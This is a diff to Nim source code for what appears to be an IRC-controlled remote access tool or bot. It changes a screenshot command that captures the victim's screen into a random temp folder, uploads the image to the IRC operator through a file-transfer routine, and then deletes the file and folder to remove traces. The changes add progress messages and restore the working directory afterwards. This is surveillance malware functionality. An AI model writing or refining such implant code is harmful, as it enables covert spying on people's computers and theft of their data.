@@ -335,25 +335,33 @@ proc cmd_setSendSleep(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.asy
 
 
 proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
+    var current_dir = getCurrentDir()
     try:
         randomize()
         var
             rand_dir_dame = rand(100000..999999)
             rand_filename = rand(100000..999999)
             scrndir = getTempDir() & $rand_dir_dame
+
         if not dirExists(scrndir):
+            discard client.privmsg(event.origin,"dir missing, creating dir")
             createDir(scrndir)
 
-        srcn_screenshot(scrndir & "\\" & $rand_filename & ".bmp")
+        setCurrentDir(scrndir)
+        discard client.privmsg(event.origin,"taking screenshot")
+        srcn_screenshot($rand_filename & ".bmp")
         
+
         if not fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
             discard client.privmsg(event.origin, "failed to create screenshot")
             if dirExists(scrndir):
                 removeDir(scrndir)
             return
         else:
-            var faketokens:seq[string] = @["",scrndir & "\\" & $rand_filename & ".bmp"]
+            await client.privmsg(event.origin,"screenshot was created and was found. trying to upload")
+            var faketokens:seq[string] = @["", $rand_filename & ".bmp"]
             await cmd_getFileIO(event, client, faketokens)
+            await client.privmsg(event.origin,"starting cleanup")
             if fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
                 removeFile(scrndir & "\\" & $rand_filename & ".bmp")
             if dirExists(scrndir):
@@ -361,6 +369,8 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
             return
     except OSError as e:
         discard client.privmsg(event.origin, "there was trouble while taking the screenshot [" & repr(e) & "]")
+    finally:
+        setCurrentDir(current_dir)
 
 
 
